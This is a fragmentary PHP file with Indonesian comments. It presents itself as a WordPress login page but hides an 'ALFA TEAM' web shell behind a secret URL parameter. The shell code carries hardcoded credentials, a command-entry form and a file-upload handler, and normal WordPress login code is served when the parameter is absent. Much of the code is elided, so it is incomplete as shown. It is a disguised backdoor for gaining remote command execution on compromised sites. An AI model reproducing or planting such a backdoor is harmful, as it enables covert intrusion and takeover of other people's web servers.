<?php
/**
 * Hybrid Script - Hidden Shell & WordPress Login Fallback
 * 
 * Mengaktifkan shell ALFA saat parameter ?kyy=acktifisamb ada,
 * selain itu menampilkan halaman login WordPress normal
 */

// Cek apakah parameter kyy=acktifisamb ada di URL
if (isset($_GET['kyy']) && $_GET['kyy'] === 'acktifisamb') {
    
    // ========== ALFA TEAM SHELL CODE ==========
    
    $GLOBALS['oZgNypoPRU'] = array(
        'username' => 'alfa',
        'password' => '145f4252ccbad212214cd1f0f8220d1a',
        'safe_mode' => '1',
        'login_page' => '403',
        'show_icons' => '1',
    ...
    // Basic shell output
    echo '<html><head><title>ALFA Shell</title></head>
    <body bgcolor="#000000" text="#00FF00">
    <pre>';
    echo "ALFA TEAM Shell Active\n";
    echo "======================\n\n";
    ...
    echo '</pre>
    <form method="post">
    Command: <input type="text" name="cmd" size="60">
    ...
    if (isset($_FILES['file']) && isset($_POST['upload'])) {
        ...
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo "<p style='color:lime'>Uploaded: $target</p>";
        } else {
	...
	case 'rp':
		...
		<p id="nav">
			...
			if ( get_option( 'users_can_register' ) ) {
				...
				echo esc_html( $login_link_separator );/** This filter is documented in wp-includes/general-template.php */
				echo apply_filters( 'register', $registration_url );
			}
